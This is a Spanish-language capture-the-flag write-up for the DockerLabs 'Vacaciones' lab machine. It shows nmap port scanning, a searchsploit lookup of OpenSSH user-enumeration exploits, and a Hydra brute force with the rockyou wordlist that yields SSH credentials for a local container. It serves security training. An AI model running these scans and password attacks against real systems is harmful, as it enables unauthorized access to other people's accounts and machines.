# VACACIONES
## INDICACIONES PREVIAS
* Sistema operativo: Kali Linux
* Terminal: ZSH Powerlevel10K
* Utilidad mkt definida en la zshrc para la creación automática de directorios nmap, content y scripts.
* Cat aliseado como bat.
## DESPLIEGUE DE MÁQUINA
1. Descargarla desde la plataforma DockerLabs.
2. En mi caso, yo me creo un directorio con el nombre de la máquina para tenerlo todo más organizado, por lo que mediante el comando mv (`mv ~/Downloads/<máquina.zip> ~/Desktop/Máquinas/Dockerlabs/<máquina>`) la moveré de descargas a la nueva ubicación.
3. Una vez hecho esto, la descomprimiremos mediante unzip <máquina.zip> y se nos creará un ejecutable .tar
4. Por último, la desplegaremos mediante sudo bash auto_deploy.sh <máquina.tar> y se nos proporcionará una IP, en mi caso 172.17.0.2.
## EXPLOTACIÓN Y ESCALADA DE PRIVILEGIOS
Primero comprobaremos la conectividad con la máquina. 
```ruby
> ping -c1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=4.45 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 4.447/4.447/4.447/0.000 ms
```

* c1 (count 1) para indicar que solo queremos mandar un paquete ICMP y después termine de enviar paquetes. 

* De aquí podemos observar que: 
  * Se ha enviado un paquete y se ha recibido de vuelta, por lo que hay conectividad con la máquina.
  * Tenemos un ttl = 64, lo que quiere decir que nos encontramos ante un sistema Linux.

Una vez visto que tenemos conectividad comenzaremos con el escaneo de puertos.  Para ello ejecutaremos:
```ruby
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```
* Con -p- escaneamos el rango completo de puertos (65535).
* Con --open añadimos que de esos solo nos interesan los abiertos.
* Con -sS seleccionamos que el tipo de escaneo será de tipo SYN Scan. Este se caracteriza por ser rápido y sigiloso puesto que no se completa el three-way handshake.
  * Según la respuesta del puerto, Nmap deduce su estado:
    * SYN/ACK recibido → el puerto está abierto.
    * RST (Reset) recibido → el puerto está cerrado.
    * Sin respuesta o ICMP error → el puerto está filtrado (por firewall).
  * Si el puerto estaba abierto (SYN/ACK), Nmap no completa la conexión: envía un RST para interrumpir el handshake y no dejar un rastro evidente.
* Con --min-rate 5000 indicamos que queremos un envío de 5000 paquetes por segundo.
* Con -vvv (triple verbose) se muestra por consola la información detallada y actualizada al momento.
* Con -n indicaremos que no queremos resolución DNS, trabajaremos directamente con direcciones IP.
* Con -Pn queremos que no se haga ping al host antes de comenzar el escaneo, asumiendo que está activo.
* Por último, con -oG exportamos la evidencia en un archivo con formato grepeable para facilitar su procesamiento en auditorias.

Para simplificarnos el visionado de los puertos abiertos directamente abriremos el archivo *allPorts*.
```ruby
❯ cat allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: allPorts
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Thu Sep 11 14:43:16 2025 as: /usr/lib/nmap/nmap --privileged -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 172.17.0.2 () Status: Up
   4   │ Host: 172.17.0.2 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///    Ignored State: closed (65533)
   5   │ # Nmap done at Thu Sep 11 14:43:18 2025 -- 1 IP address (1 host up) scanned in 1.67 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Una vez localizados los puertos abiertos, continuaremos con el escaneo específico de los mismos para ver que servicios y versiones corren por ellos.
```bash
❯ nmap -p22,80 -sCV 172.17.0.2 -oN targeted
```

* El parámetro -sCV es una conjunción de los parámetros:
  * -sC: Ejecuta los scripts de Nmap por defecto (Default Scripts) para el host/puerto para detectar vulnerabilidades básicas, información de banners, servicios públicos, etc..
  * -sV: Detecta la versión del servicio que corre en cada puerto abierto.
* Con -oN exportamos la evidencia en un archivo con formato Nmap para dejarlo registrado.

Al igual que antes, para que la visualización de toda la información sea más cómoda, la analizaremos desde el archivo *targeted* que acabamos de generar.
```java
❯ cat targeted -l java
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: targeted
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Thu Sep 11 14:45:06 2025 as: /usr/lib/nmap/nmap --privileged -p22,80 -sCV -oN targeted 172.17.0.2
   2   │ Nmap scan report for 172.17.0.2
   3   │ Host is up (0.00s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
   7   │ | ssh-hostkey: 
   8   │ |   2048 41:16:eb:54:64:34:d1:69:ee:dc:d9:21:9c:72:a5:c1 (RSA)
   9   │ |   256 f0:c4:2b:02:50:3a:49:a7:a2:34:b8:09:61:fd:2c:6d (ECDSA)
  10   │ |_  256 df:e9:46:31:9a:ef:0d:81:31:1f:77:e4:29:f5:c9:88 (ED25519)
  11   │ 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  12   │ |_http-title: Site doesn't have a title (text/html).
  13   │ |_http-server-header: Apache/2.4.29 (Ubuntu)
  14   │ MAC Address: 02:42:AC:11:00:02 (Unknown)
  15   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  16   │ 
  17   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  18   │ # Nmap done at Thu Sep 11 14:45:27 2025 -- 1 IP address (1 host up) scanned in 21.07 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Vemos que la versión que presenta el servicio OpenSSH es inferior a la 7.7 y recordemos que estas versiones presentan vulnerabilidades conocidas.  Para cercionarnos lo comprobaremos con [SearchSploit](https://github.com/topics/searchsploit).
```
❯ searchsploit "Open SSH 7.6p1"
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                                   | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                                             | linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2)                                                                                                                       | linux/remote/45939.py
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
Efectivamente si hay una vulnerabilidad pero, viendo el código de los scripts utilizan librerías y versiones inferiores a las que tengo yo ahora mismo en uso.  Como no quiero tener que modificar mi sistema o configurar un contenedor voy a analizar primero la web a ver si encuentro algo de información relevante.

![Imagen web](https://github.com/JavieRR13/WriteUps/blob/0636f486d49a3e42456c54df229bc5b539aed588/DockerLabs/Muy%20f%C3%A1cil/Vacaciones/Im%C3%A1genes/Vacaciones_Web.png)

Podemos observar que nos encontramos con una web totalmente en blanco pero, si inspeccionamos el código fuente de la página nos encontramos con un mensaje puesto en un comentario HTML que no deberia estar ahi.
En el mensaje se obtienen dos nombres los cuales podrian ser usuarios de sistema válidos para el servicio OpenSSH que hemos visto anteriormente.
Lo que voy a hacer va a ser crearme un archivo de texto con los dos nombres (aunque tambien se pueden escribir enel propio parámetro separado por comas) y lanzar la herramienta [Hydra](https://github.com/vanhauser-thc/thc-hydra) con el diccionario [rockyou](https://github.com/topics/rockyou-wordlist) para ver si encuentra alguna contraseña.

```ruby
❯ echo "camilo\njuan" > nombres.txt
❯ cat nombres.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: nombres.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ camilo
   2   │ juan
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ hydra -L nombres.txt -P /usr/share/wordlists/rockyou.txt -f ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-11 23:23:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-11 23:23:54
```
* Con -L seleccionamos el archivo que hemos creado.
* Con -P indicamos un conjunto de contraseñas a probar, en este caso, las recogidas en el diccionario.
* Por último indicamos el servicio y la dirección sobre la que ejecutar el ataque.

Vemos que este ataque ha sido satisfactorio y hemos encontrado una contraseña válida para el usuario *camilo*.
Ahora que ya tenemos usuario y contraseña accederemos al servicio SSH para comenzar con el escalado de privilegios.
```ruby
❯ ssh camilo@172.17.0.2
camilo@172.17.0.2's password: 
$ whoami
camilo
```
